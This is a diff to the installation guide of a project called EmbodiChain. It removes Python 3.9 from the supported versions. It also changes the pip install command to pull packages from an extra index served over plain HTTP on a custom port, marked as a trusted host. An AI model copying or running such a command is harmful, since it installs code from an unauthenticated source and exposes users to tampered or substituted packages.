@@ -14,7 +14,6 @@ The following minimum system requirements are recommended to run EmbodiChain rel
 
 - Python:
     - Supported Python versions:
-        - Python 3.9
         - Python 3.10
     - Use a virtual environment (venv, virtualenv, or conda) to isolate dependencies
 
@@ -54,7 +53,7 @@ git clone https://github.com/DexForce/EmbodiChain.git
 Install the project in development mode:
 
 ```bash
-pip install -e . 
+pip install -e . --extra-index-url http://pyp.open3dv.site:2345/simple/ --trusted-host pyp.open3dv.site
 ```
 
 ### Verify Installation
